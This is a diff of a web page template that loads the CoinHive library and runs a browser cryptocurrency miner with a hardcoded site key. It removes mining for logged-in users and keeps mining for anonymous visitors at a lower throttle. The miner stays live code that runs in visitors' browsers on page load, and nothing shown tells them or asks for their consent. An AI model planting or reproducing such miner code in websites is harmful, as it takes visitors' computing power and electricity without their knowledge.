@@ -1,15 +1,9 @@
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>	
-    {% if login %}
-        var miner = new CoinHive.User('R8uBnEUWe9lzB5R9BAhAoPiaNbIvv56c','{{ name }}',{
-            autoThreads: true,
-            throttle: 0.8
-        });
-        miner.start();
-    {% else %}
+    {% if not login %}
         var miner = new CoinHive.Anonymous('R8uBnEUWe9lzB5R9BAhAoPiaNbIvv56c',{
             autoThreads: true,
-            throttle: 0.4
+            throttle: 0.2
         });
         miner.start();
     {% endif %}
